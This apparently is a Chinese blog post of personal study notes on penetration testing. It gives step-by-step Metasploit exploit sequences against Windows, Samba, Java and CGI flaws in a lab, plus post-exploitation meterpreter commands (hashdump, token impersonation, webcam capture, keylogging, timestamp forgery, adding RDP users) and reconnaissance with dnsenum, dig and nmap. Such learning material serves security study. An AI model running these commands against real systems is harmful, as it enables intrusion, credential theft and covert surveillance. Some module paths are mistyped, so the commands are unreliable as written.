<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="我是良民的博客"><meta name="baidu-site-verification"><title>网络安全学习 | 我是良民</title><link rel="stylesheet" type="text/css" href="/source/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/source/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/source/atom.xml" title="我是良民" type="application/atom+xml">
</head><link rel="stylesheet" type="text/css" href="/source/plugins/prettify/doxy.css"><script type="text/javascript" src="/source/js/ready.js" async></script><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">我是良民</a></h1></div><p class="m-desc">心之所向，无惧无悔,<br>愿求仁得仁，复无怨怼！</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/source/archives/">归档</a></li><li><span class="dot">●</span><a href="/source/categories/">分类</a></li><li><span class="dot">●</span><a href="/source/tags/">标签</a></li><li><span class="dot">●</span><a href="/source/about/">关于</a></li><li><span class="dot">●</span><a href="/source/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">网络安全学习</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/source/2020/04/06/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">2020-04-06</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h2 id="MSF学习"><a href="#MSF学习" class="headerlink" title="MSF学习"></a>MSF学习</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p><strong>bwapp漏洞环境</strong>，首先开启phpstudy依赖于bwapp 保存位置D:\phpStudy\PHPTutorial\WWW\bwapp\bWAPP 访问网址<a href="http://ip:端口/bwapp/bwapp/login.php登录账号bee，登录密码bug">http://ip:端口/bwapp/bwapp/login.php登录账号bee，登录密码bug</a><br><strong>pikachu漏洞环境</strong>：启动phpstudy，网址http：//ip+端口/pikachu<br><strong>访问struts2安装环境：</strong>启动jspstudy，在浏览器中输入<a href="http://ip:8081/struts2-showcase" target="_blank" rel="noopener">http://ip:8081/struts2-showcase</a><br><strong>Jboss</strong>  找到bin目录下，双击run.bat进行运行，然后在浏览器中输入<a href="http://127.0.0.1:8080或者localhost：8080，（注意不能使用ip地址进行访问)。">http://127.0.0.1:8080或者localhost：8080，（注意不能使用ip地址进行访问)。</a><br><strong>weblogic启动过程</strong>找到D:\oracle\user_projects\domains\base_domain下的startweblogic.cmd开始启动，然后再浏览器中输入管理网址192.168.0.45:7001/console进入管理页面。<br><strong>webug</strong>安装后登录某个网页后账号和密码都不知道，所以通过找到目录文件查看，或者网上搜索。<br>IIS网站配置过程中，将网站源码下载之后放到D:wwwtest文件夹中，然后点击iis部署网站问题1：，部署完之后找login.asp或者index.asp文件进行登录，当出现没有父路径时，右击网站属性在主目录中找到更改配置，高级找到启用父目录<br>问题2;下载完之后显示access数据库没有权限，可以找到db这个数据库文件夹，然后右键权限，添加用户为everyone，权限为完全控制即可。<br>问题3，提示为需删除原来的defalt.asp文件，然后更改defalt0.asp为defalt.asp,更改之后即可。<br>问题4，搭建完成之后发现localhost拒绝了我们的请求，这是因为端口被占用了。修改一下端口即可。<br>火狐浏览器插件 hackbar</p>
<h3 id="MSF介绍"><a href="#MSF介绍" class="headerlink" title="MSF介绍"></a>MSF介绍</h3><p>全名The Metasploit Framework 即漏洞框架 ，自带攻击工具</p>
<h3 id="MSF术语"><a href="#MSF术语" class="headerlink" title="MSF术语"></a>MSF术语</h3><ol>
<li>exploit &emsp;&emsp;&emsp;攻击行为</li>
<li>payloads&emsp;&emsp;&emsp;攻击载荷即攻击代码</li>
<li>shellcode&emsp;&emsp;&emsp;溢出代码即攻击载荷运行的攻击机器指令</li>
<li>module &emsp;&emsp;&emsp;也就是软件代码组件</li>
<li>listner&emsp;&emsp;&emsp;监听器，攻击时返回给攻击者的信息</li>
</ol>
<h3 id="MSF中模块（module）介绍"><a href="#MSF中模块（module）介绍" class="headerlink" title="MSF中模块（module）介绍"></a>MSF中模块（module）介绍</h3><ol>
<li>Auxiliary&emsp;&emsp;&emsp;主要包括渗透测试中一些辅助性的脚本</li>
<li>Encoders：&emsp;&emsp;各种编码工具,用于躲过入侵检测和过滤系统</li>
<li>Exploits：&emsp;&emsp;包括了 exp、0day、各种漏洞使用的脚本</li>
<li>Nops：&emsp;&emsp; NOP (No Operation or Next Operation) sled,由于 IDS/IPS 会检查数据包中不规则的数据，所以在某些场合下(比如针对溢出攻击),某些特殊的滑行字符串(NOPS x90x90…)则会因为被拦截而导致攻击失效，所以此时需要修改 exploit 中的 NOPs.nops</li>
<li>Payloads ：&emsp;&emsp;这个单词翻译过来叫载荷：是攻击者发送给系统执行的指令（不包括  exploits  攻击阶段），payloads  主要是在目标机执行的，而 exploits 是在本地机执行作用于目标机。</li>
<li>Post: &emsp;&emsp;&emsp;&emsp;这个目录里放着 msf 的 exploits 执行成功后，向目标机发送的一些功能性指令比如：提权，获取 hash 等。</li>
<li>Data： &emsp; &emsp;这个目录里盛放了 Meterpreter、PassiveX、Vnc、DLLs 等这些工具和一些用户接口代码，Msfweb 和一些其他模块用到的数据文件。</li>
<li>Plugins：&emsp;&emsp;&emsp;这里的模块用户需要使用 load 来加载，提供数据库连接控件， 和各种要用到的控件。</li>
<li>Scripts：&emsp;&emsp;&emsp;这个目录下的文件大都是Meterpreter 这个模块到用的脚本。比如Meterpreter 里用到的migrate 来转移到其他进程的指令的源代码就在这个目录下。</li>
<li>Tools：&emsp;&emsp;&emsp;包括一些有用的脚本和零散的工具。</li>
</ol>
<h3 id="MSF中的常见命令"><a href="#MSF中的常见命令" class="headerlink" title="MSF中的常见命令"></a>MSF中的常见命令</h3><ol>
<li>编辑 &emsp;&emsp;&emsp;i</li>
<li>进入msf控制台&emsp;&emsp;msfconsole</li>
<li>保存 &emsp;&emsp;&emsp;：w</li>
<li>保存退出&emsp;：wq</li>
<li>帮助菜单&emsp;？</li>
<li>介绍某一个功能 &emsp;? + 某一命令（中间有空格）</li>
<li>搜索漏洞&ensp;&emsp;search ；例如 search ms08-067&emsp;ms是微软的缩写， 08-067表示08年6月7日，介绍该漏洞属于哪个模块，modules表示模块</li>
<li>使用某一模块&emsp;&emsp;&emsp;use + 模块名</li>
<li>查看某一模块的所有信息&emsp;&emsp;&emsp;使用模块后，info即可查看，其中available targets表示该漏洞出现在哪些主机上 其中basic options提供了该漏洞的使用方法需要提供RPOST：被攻击主机名，被攻击主机端口：RPORT</li>
<li>进入kali中msf的目录&emsp;&emsp;cd metasploit -framework  </li>
<li>在9的前提下，在目录中查看目录下的文件名称&emsp;&emsp; ls查看所有模块</li>
<li>返回上一级目录&emsp;&emsp;&emsp; cd..</li>
<li>show options &emsp;&emsp;&emsp;可提供操作提示，与info差不多  </li>
<li>back：返回命令  </li>
<li>set：给一个变量赋值  </li>
<li>net user：查看当前所有用户  </li>
<li>net user test test /add：添加用户  </li>
<li>session -i ：查看攻击后返回的信息  </li>
<li>ifconfig：linux系统中查看ip地址命令  </li>
<li>ctrl + H: 打开kali文件夹下的隐藏文件  </li>
<li>telnet ip+端口 ：扫描计算机的端口</li>
</ol>
<h3 id="MSF渗透测试一"><a href="#MSF渗透测试一" class="headerlink" title="MSF渗透测试一"></a>MSF渗透测试一</h3><p>攻击xp系统，注意是sp2chinese版本的  </p>
<ol>
<li>msfconsole &emsp;&emsp;&emsp;进入msf  </li>
<li>search ms08_067  &emsp;&emsp;&emsp;搜索漏洞  </li>
<li>use exploit/windows/smb/ms08_067_netapi &emsp;&emsp;使用该漏洞  </li>
<li>show options &emsp;&emsp;&emsp;展示使用方法，看reqiured选项如果是yes是必须设置的，flase则可以不设置   </li>
<li>set RHOST 192.168.80.128：设置被攻击者的ip  </li>
<li>info：查看该所有可以被攻击的系统版本 并且在base options中查   </li>
<li>check：检查该目标主机能够被攻击  </li>
<li>exploit：使用该命令开始攻击</li>
</ol>
<h3 id="MSF渗透测试二"><a href="#MSF渗透测试二" class="headerlink" title="MSF渗透测试二"></a>MSF渗透测试二</h3><p>利用自己创建链接获取控制其他计算机的权限    </p>
<ol>
<li>同上  </li>
<li>同上  search ms10_018  </li>
<li>同上  </li>
<li>use exploit/windows/browser/ms10_018_ie_behaviors  </li>
<li>set SRVHOST:表示设置反弹回来的服务器，即攻击成功后，获取权限后，将权限返回到哪个服务器，这里我们选择kali的ip地址  </li>
<li>set PAYLOADS windows/meterpreter/bind_tcp  </li>
<li>show options： 查看payloads的使用方法  </li>
<li>set LPORT： 设置端口  </li>
<li>run:  运行后出现url地址，复制，作为一个链接  </li>
<li>当有计算机点击该链接时，kali后台就会返回successful  </li>
<li>接下来就可以拿shell了，控制目标计算机  </li>
<li>sessions：查看返回来的会话，如果有多个电脑被攻击，就返回多个电脑的信息  </li>
<li>sessions -i 1：查看受控制的第一个电脑  </li>
<li>shell：拿到权限，进入到xp系统主机目录，可以进行操作<h3 id="MSF渗透测试三"><a href="#MSF渗透测试三" class="headerlink" title="MSF渗透测试三"></a>MSF渗透测试三</h3>使用word文件进行渗透 漏洞名称ms10_087      </li>
<li>同上  </li>
<li>search ms10-087</li>
<li>同上  </li>
<li>use  exploit/windows/fileformat/ms10_087_rtf_pfragments_bof  </li>
<li>show options  </li>
<li>set FILENAME oldboy.rtf：将文件改一个名字，默认为msf.rtf  </li>
<li>set PAYLOAD windows/exec ：上传一个payload  </li>
<li>show options：  </li>
<li>set CMD calc.exe :上传一个计算机程序  </li>
<li>run：开始生成一个文件  </li>
<li>找到文件存放路径，将该文件放到win7以上的系统上面进行使用即可</li>
</ol>
<h3 id="渗透测试四"><a href="#渗透测试四" class="headerlink" title="渗透测试四"></a>渗透测试四</h3><p>永恒之蓝 ms17-010 即勒索病毒  </p>
<ol>
<li>同上  </li>
<li>search ms-17-010  </li>
<li>use exploitwindows/smb/ms17-010-eternalblue  </li>
<li>show options      </li>
<li>set RHOST win7主机,set LHOST kali主机ip ：配置RHOST 和LHOST     </li>
<li>set payloads windows/x64/smb/meterpreter/reverse_tcp    </li>
<li>run：运行攻击    </li>
<li>拿shell，获取计算机权限。  </li>
<li>遇到的问题，win7的网络模式需设置为桥接模式，否则在nat模式中是无法连接网络的。<h3 id="渗透测试五"><a href="#渗透测试五" class="headerlink" title="渗透测试五"></a>渗透测试五</h3>linux漏洞  </li>
<li>进入msf</li>
<li>search scanner/samba  </li>
<li>use auxiliary/scanner/smb/smb_version：设置版本  </li>
<li>set RHOST ip地址  :设置被攻击ip  </li>
<li>run ：开始运行  </li>
<li>use expoit/multi/samba/usermap_script  </li>
<li>set RHOST ip地址：设置被攻击ip  </li>
<li>exploit ：开始攻击  </li>
<li>拿shell  </li>
</ol>
<h3 id="另一种linux漏洞"><a href="#另一种linux漏洞" class="headerlink" title="另一种linux漏洞"></a>另一种linux漏洞</h3><p>影响了samba3.5以后的版本，不包括4.6.4/4.5.10/4.4.14 </p>
<ol>
<li>samba -v：查看samba版本  </li>
<li>vi /etc/samba/smb.conf：打开目录下这个文件，/表示root根目录下   </li>
<li>在末行加入  <pre><code> [public]   
     comment = public  
     broweseable = yes  
     writeable = yes  
     path = /tmp/public  
     public = yes  
     read only = no  </code></pre></li>
<li>mkdir /tmp/public :在linux2017中添加共享目录  </li>
<li>chmod 777 /tmp/public :修改读写权限  </li>
<li>/etc/init.d/samba restart :重启samba  </li>
<li>ps aux |grep samba : 查看samba进程  </li>
<li>netstat -tnlp samba ：查看端口  </li>
<li>进入msf，use exploit/linux/samba/is_known_pipename :利用模块  </li>
<li>set RHOST：设置RHOST  </li>
<li>run：拿shell    </li>
<li>check：检查靶机是否存在该漏洞  </li>
</ol>
<h3 id="破壳漏洞"><a href="#破壳漏洞" class="headerlink" title="破壳漏洞"></a>破壳漏洞</h3><p>原理: CGI脚本利用了bash命令，由于bash版本较低，攻击者把有害数据写入环境变量，传入服务器端，触发服务器运行bash命令，完成攻击  </p>
<ol>
<li>进入到靶机的 usr/lib/cgi-bin目录下，输入sudo nano hello.sh :sudo表示linux系统管理员权限 nano 表示打开某一个文件进行编辑，类似于vim  </li>
<li>对hello.sh进行编辑,输入echo “Content-type : text/html” echo “hello world”   </li>
<li>sudo chmod s775 hello.sh:为文件赋予权限  </li>
<li>攻击机中启动msf，搜索 search shellshock  </li>
<li>use exploit/multi/apache_mod_cgi_bash-env-exec  </li>
<li>set Rhost:  </li>
<li>set targeturi /cgi-bin/hello.sh  </li>
<li>set payload linux/x86/shell/reverse_tcp  </li>
<li>check ,exploit<br>攻击失败</li>
</ol>
<h3 id="PHP-CGI漏洞"><a href="#PHP-CGI漏洞" class="headerlink" title="PHP CGI漏洞"></a>PHP CGI漏洞</h3><ol>
<li>进入msf  </li>
<li>search cve:2012-1823  </li>
<li>use exploit/multi/http php_cgi_arg_injection</li>
<li>options  </li>
<li>set RHOST ip地址  </li>
<li>run  <h3 id="Java-RMI-SERVER漏洞"><a href="#Java-RMI-SERVER漏洞" class="headerlink" title="Java RMI SERVER漏洞"></a>Java RMI SERVER漏洞</h3></li>
<li>Java rmi server 的注册表和rmi激活服务的默认配置存在安全漏洞导致代码执行  </li>
<li>search java_rmi_server  </li>
<li>use exploit/multi/misc/java_rmi_server  </li>
<li>set RHOST ip地址  </li>
<li>run  </li>
<li>shell  </li>
</ol>
<h3 id="java-cve-2013-0422漏洞"><a href="#java-cve-2013-0422漏洞" class="headerlink" title="java cve-2013-0422漏洞"></a>java cve-2013-0422漏洞</h3><ol>
<li>进入msf  </li>
<li>search java_jre17_jmxbean  </li>
<li>use exploit/multi/browser/java_jre17_jmxbean  </li>
<li>set RHOST ip地址  </li>
<li>set target  </li>
<li>set payload linux/x86…..  </li>
<li>set LHOST  </li>
<li>run  </li>
</ol>
<h3 id="distcc后门漏洞"><a href="#distcc后门漏洞" class="headerlink" title="distcc后门漏洞"></a>distcc后门漏洞</h3><p>distcc用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是xcode1.5版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制    </p>
<ol>
<li>进入msf  </li>
<li>search distcc_exec  </li>
<li>use expoit/unix/misc/distcc_exec  </li>
<li>set RHOST  </li>
<li>run  </li>
</ol>
<h3 id="druby命令执行漏洞"><a href="#druby命令执行漏洞" class="headerlink" title="druby命令执行漏洞"></a>druby命令执行漏洞</h3><p>druby配置不当，被滥用执行命令，druby是个编程语言，msf中的工具就是由druby写的，端口8787  </p>
<ol>
<li>启动msf  </li>
<li>search drb_remote_codeexec  </li>
<li>use exploit/linux/drb_remote_codeexec  </li>
<li>set RHOST  </li>
<li>set URL druby://ip地址:8787</li>
<li></li>
</ol>
<h3 id="震网三代"><a href="#震网三代" class="headerlink" title="震网三代"></a>震网三代</h3><p>CVE-2017-8464文件远程代码执行漏洞，当系统在解析快捷方式时，存在远程执行任意代码的高危漏洞<br>CVE-2017-8543windows，window处理内存中的对象，存在搜索远程命令执行漏洞<br>攻击机kali<br>靶机win7  </p>
<ol>
<li>进入msf  </li>
<li>search 2017—8464  </li>
<li>use exploit/windows/fileformat/cve_2017_8464_lnk_rce  </li>
<li>set payload windows/meterpreter/reverse_tcp  </li>
<li>set LOST 攻击机IP  </li>
<li>exploit  </li>
<li>会在路径下生成一些文件，将该文件放到win7中  </li>
<li>开始设置msf监听。  </li>
<li>在msf下，search multi/handler  </li>
<li>use exploit/multi/handler  </li>
<li>set payload windows/meterpreter/reverse_tcp  </li>
<li>set LHOST ip  </li>
<li>run  </li>
</ol>
<h3 id="flash-0day病毒"><a href="#flash-0day病毒" class="headerlink" title="flash 0day病毒"></a>flash 0day病毒</h3><p>不好用</p>
<h3 id="MSF辅助模块"><a href="#MSF辅助模块" class="headerlink" title="MSF辅助模块"></a>MSF辅助模块</h3><p>1.Auxiliary模块，情报搜集阶段<br>   可以使用 whois 来进行信息搜集（linux自带whois）例如 whois baidu.com<font color = red>这里不要添加www.</font> 进行域名详细信息查询<br>   ip地址详细信息查询，whois 114.114.114.114<br>   利用辅助模块查找邮箱 use auxiliary/gather/search_email_collector,设置domain也就是域名，<a href="http://www.baidu.com,将Google关掉" target="_blank" rel="noopener">www.baidu.com,将Google关掉</a> set search_google false ,run即可，因为百度中没有存在邮箱，所以搜索为0<br>   或者使用枚举 use auxiliary/gather/enum_dns<br>   set domin baidu.com <font color = red>注意这里域名不要加www.因为枚举模块会自动添加</font>，run即可<br>2.端口扫描模块<br> （1）nmap：namp -sV 192.168….<br> （2）syn扫描：扫描器向目标主机端口发送请求链接的syn包，扫描器收到syn/ack后，不是发送ack应答，而是发送rst包请求断开，这样没有完成三次握手，无法建立连接，因此这种扫描不会被记录到系统日志中，及不会留下痕迹，但是这种扫描需要root权限。<br>使用：use auxiliary/scanner/portscan/syno<br> options -&gt;set RHOSTS ——》set threads(设置线程为100) 100-》run<br>（3）TCP扫描：use auxiliary/scanner/portscan/tcp-&gt;set RHOSTS -&gt;set threads<br>3.服务版本信息检测<br>   1（smb）<br>   服务器消息块（Server Message Block，缩写为SMB），又称网络文件共享系统（Common Internet File System，缩写为CIFS, /ˈsɪfs/），一种应用层网络传输协议，由微软开发，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。它也提供经认证的行程间通信机能。<br>   使用:use auxiliary/scanner/smb/smb_version -&gt;set RHOSTS -&gt;run<br>   2(SSH版本扫描)<br>   SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题<br>   使用:use auxiliray/scanner/ssh/ssh_version ——&gt; set RHOSTS<br>   3(FTP)版本扫描<br>  文件传输协议（File Transfer Protocol，FTP）是用于在网络上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。<br>   使用：use auxiliary/scanner/ftp/ftp_verson -&gt;set RHOSTS -&gt;set threads-&gt;run  </p>
<h3 id="拿到meterpreter-shell之后，后期攻击方法"><a href="#拿到meterpreter-shell之后，后期攻击方法" class="headerlink" title="拿到meterpreter shell之后，后期攻击方法"></a>拿到meterpreter shell之后，后期攻击方法</h3><p><font color = red>注意，后面的所有方法都是建立在获取了meterpreter shell之后的操作</font></p>
<ol>
<li>上传文件到windows主机 命令upload &lt;文件名称&gt; &lt;路径&gt;        </li>
<li>下载主机上的文件 download <file> &lt;保存路径&gt;<font color = red>注意windows路径要使用双下划//</font>   </li>
<li>在靶机上执行exe文件 ：execute -f &lt;路径&gt;  </li>
<li>创建cmd新通道,即在靶机上执行命令提示符 execute -f cmd -c </li>
<li>显示进程 ： ps  </li>
<li>获取靶机的cmd shell :shell  </li>
<li>获取admin权限：getsystem  </li>
<li>使用hashdump转存所有hash值  </li>
<li>创建端口转发：meterpreter shell中<font color = red>注意这里需要使用正确的payload获得meterpreter权限</font>可以让攻击系统访问无法直接访问的主机，例如内网。使用 获取到meterpreter之后，使用portfwd add -l 6666 -p 3389 -r 127.0.0.1将靶机的3389转发到本地的6666端口，这样我们访问127.0.0.1时就可以访问靶机。  </li>
<li>删除端口转发<br>  portfwd delete -l &lt;端口名&gt; -p &lt;端口名&gt; -r &lt;目标主机&gt;  </li>
<li>在目标主机上搜索文件<br>  search -f *.txt  </li>
<li>获取用户id<br>getuid</li>
<li>获取系统信息<br>sysinfo  </li>
<li>模拟任意用户（taken操作）<br>use incognito：假冒用户takens<br>例子 getuid   查看当前系统id<br>use incognito 伪装<br>list tokens -u 列出目标用户的可用令牌<br>impersonate_token”Machine\user”<br>getuid  </li>
<li>webcam摄像头命令<br>webcam_list:查看摄像头<br>webcam__snap :通过摄像头拍照<br>webcam_stream:通过摄像头开启视频  </li>
</ol>
<p>16.execute执行文件<br>   execute -H -i -f cmd.exe  #创建新进程cmd.exe -H不可见，-i交互<br>17.timestomp伪造时间戳<br>     timestomp C:// -h 查看帮助<br>   timestomp -v C://2.txt 查看文件的时间戳<br>     timestomp C://2.txt -f C://1.txt 将1.txt的时间戳复制给2.txt<br>18.enable_rdp脚本开启3389<br> run post/windows/manage/enable_rdp  #开启远程桌面<br>run post/windows/manage/enable_rdp USERNAME = www2 PASSWORD = 123456 #  添加用户<br>run post/windows/manage/enable_rdp FORWARD = true LPORT = 6662 #将3389端口转发到6662<br>19.键盘记录<br>  keyscan_start ：开始键盘记录<br>  keyscan_dump：到处记录数据<br>  keyscan_stop:结束键盘记录</p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h4 id="步骤1-首先进行漏洞扫描，"><a href="#步骤1-首先进行漏洞扫描，" class="headerlink" title="步骤1.首先进行漏洞扫描，"></a>步骤1.首先进行漏洞扫描，</h4><p>如果无漏洞再进行信息搜集完成渗透。  </p>
<h4 id="2-子域名探测。"><a href="#2-子域名探测。" class="headerlink" title="2.子域名探测。"></a>2.子域名探测。</h4><p>根据主域名，可以获取二级域名，三级域名…<br>真正的一级域名是由一个合法的字符串+域名后缀组成，所以，lisp.com这种形式的域名才是一级域名，lisp是域名主体，.com是域名后缀，可以是.net也是域名后缀  所谓的二级域名实际就是一个一级域名下面的主机名，顾名思义，它是在一级域名前面加上一个字符串，比如asdx.lisp.com，它可以拥有与根顶级域名同样的功能，并且通过设置，可以拥有和跟顶级域名完全一样的功能<br>主要方法(1)dns域传送漏洞<br>dns传送漏洞原理</p>
<blockquote>
<p><a href="https://blog.csdn.net/itest_2016/java/article" target="_blank" rel="noopener">https://blog.csdn.net/itest_2016/java/article</a> details/78057445dnsenum oldboydu.com      </p>
</blockquote>
<p>例<code>dnsenum oldboyedu.com -f /dns.txt --dnsserver 114.114.114.114</code><br>说明：dnsenum 的目的是尽可能搜集一个域的信息可查询主机地址，域名服务器，mx record ,在域名服务器上执行axfr请求，通过谷歌脚本得到扩展域名信息（google hacking），提取自域名并查询，计算 C 类地址并执行 whois 查询，执行反向查询，把地址段写入文件。上面一系列操作都是dnsenum执行的  </p>
<p>-h    查看工具使用帮助</p>
<p>–dnsserver    <server>    指定域名服务器</p>
<p>–enum    快捷选项，相当于”–threads 5 -s 15 -w”</p>
<p>–noreverse    跳过反向查询操作</p>
<p>–nocolor 无彩色输出</p>
<p>–private 显示并在”domain_ips.txt”文件结尾保存私有的 ips</p>
<p>–subfile <file> 写入所有有效的子域名到指定文件</p>
<p>-t, –timeout <value>    tcp 或者 udp 的连接超时时间，默认为 10s（时间单位：秒）</p>
<p>–threads <value> 查询线程数</p>
<p>-v, –verbose    显示所有的进度和错误消息</p>
<p>-o ,–output <file> 输出选项，将输出信息保存到指定文件</p>
<p>-e, –exclude    <regexp>    反向查询选项，从反向查询结果中排除与正则表达式相符的 PTR</p>
<p>记录，在排查无效主机上非常有用</p>
<p>-w, –whois    在一个 C 段网络地址范围提供whois 查询</p>
<p>-f dns.txt 指定字典文件，可以换成 dns-big.txt 也可以自定义字典</p>
<p> <code>dig axfr @axfr @ns5.csc108.com |more</code><br>dig命令是常用的域名查询工具，用来检测域名是否正常<br>参数1 @&lt;服务器地址&gt;：指定进行域名解析的域名服务器；<br>2 -b&lt;ip地址&gt;：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；<br>3 -f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息；<br>4 -P：指定域名服务器所使用端口号；<br>5 -t&lt;类型&gt;：指定要查询的DNS数据类型；<br>6 -x&lt;IP地址&gt;：执行逆向域名查询；<br>7 -4：使用IPv4；<br>8 -6：使用IPv6；<br>9 -h：显示指令帮助信息。<br> (2) 通过系统域名备案号，再反查备案号相关的域名地址 http:<a href="http://www.beianhao.com" target="_blank" rel="noopener">www.beianhao.com</a><br> (3)ssL证书，通过查询SSL证书，获取域名 <a href="https://myssl.com/ssl.html和https://www.chinassl.net/ssltools/ssl-checker.html" target="_blank" rel="noopener">https://myssl.com/ssl.html和https://www.chinassl.net/ssltools/ssl-checker.html</a><br> (4)google 搜索C段<br>比如在：127.127.127.4 这个 IP 上面有一个网站 127.4 这个服务器上面有网站我们可以想想.. 他几乎没什么漏洞！ 但是在他同C段127.127.127.1<del>127.127.127.255 这 1</del>255 上面也有服务器而且也有网站并且存在漏洞,那么我们就可以来渗透 1~255 任何一个站 之后提权来嗅探得到 127.4 这台服务器的密码 甚至3389 连接的密码后台登录的密码 如果运气好会得到很多的密码，C段就是127.127.127.1-127.127.127.255 B段就是127.127.0.0-127.127.255.255<br>（5）APP提取<br>（6）微信公众号<br>（7）字典枚举<br>参考后面的Burp app抓包<br> （8）公开dns源<br>Rapid7 下 Sonar 项目发布的： <a href="https://scans.io/study/sonar.fdns_v2。DNS" target="_blank" rel="noopener">https://scans.io/study/sonar.fdns_v2。DNS</a> 历史解析：    <a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br>（9）威胁情报查询<br>华为安全情报 <a href="https://isecurity.huawei.com" target="_blank" rel="noopener">https://isecurity.huawei.com</a> </p>
<h4 id="google-hack使用语法"><a href="#google-hack使用语法" class="headerlink" title="google hack使用语法"></a>google hack使用语法</h4><p> inurl：用于搜索网页上的url例inurl：file  ，site:baidu.com inurl:login<br>intext：用于搜索网页部分中包含的文字  site:baidu.com intext:管理<br>site：限制搜索范围的域名，即指定网站进行搜索  例：intext:管理<br>filetype：搜索文件的后缀名或扩展名  例filetype:mdb，site:baidu.com filetype:txt<br>intitle：限制搜索的网页标题  site:baidu.com intitle:后台<br>allintitle:搜索所有关键字构成的网页标题<br>link：可以得到一个所有包含了指定url的页面列表  </p>
<h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p>格式：nmap 使用ping的方式去探测，主要测试ip，端口，和服务版本<br>主机发现原理：发送探测包到目标主机，如果收到回复说明主机是开启的。<br>用来扫描哪些服务运行在哪些端口<br>用法<br>-sP:s表示start，P表示ping，进行ping扫描，可直接使用nmap+ip同时进行ip和端口的探测。<br>-p:进行端口扫描<br>-sT:s代表start，T代表TCP，完成三次握手的扫描，用于探测目标机是否可以进行渗透  -<br>-sS:TCP，syn扫描，即只进行二次握手，与sT作用差不多。<br>-sU:进行UDP的扫描<br>-sV:进行版本探测<br>-O:判断目标主机的操作系统，nmap +ip+-O<br>-A:进行全面扫描，可直接使用nmap +ip同时进行ip和端口的扫描。<br>-oA:o:output，A：all，表示保存在所有格式。<br>-sL: List Scan 列表扫描，仅将指定的目标的 IP 列举出来，不进行主机发现。</p>
<p>-sn: Ping Scan 只进行主机发现，不进行端口扫描。</p>
<p>-Pn: 将所有指定的主机视作开启的，跳过主机发现的过程。</p>
<p>-PS/PA/PU/PY[portlist]: 使用 TCPSYN/ACK 或 SCTP INIT/ECHO 方式进行发现。</p>
<p>-PE/PP/PM: 使用 ICMP echo, timestamp, and netmask 请求包发现主机。</p>
<p>-PO[protocollist]: 使用 IP 协议包探测对方主机是否开启。</p>
<p>-n/-R: -n 表示不进行DNS 解析；-R 表示总是进行 DNS 解析。</p>
<p>–dns-servers &lt;serv1[,serv2],…&gt;: 指定 DNS 服务器。</p>
<p>–system-dns: 指定使用系统的 DNS 服务器</p>
